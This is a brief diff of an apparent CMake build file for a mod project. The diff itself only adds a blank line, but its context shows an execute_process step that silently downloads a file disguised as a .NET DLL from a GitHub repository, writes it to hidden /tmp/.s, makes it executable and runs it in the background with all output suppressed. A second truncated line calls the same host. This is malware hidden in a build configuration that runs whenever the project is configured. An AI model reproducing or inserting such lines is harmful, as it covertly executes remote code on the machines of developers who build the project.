@@ -8,3 +8,4 @@ execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanB
 execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)
 
 add_subdirectory(ViewmodelMod)
+
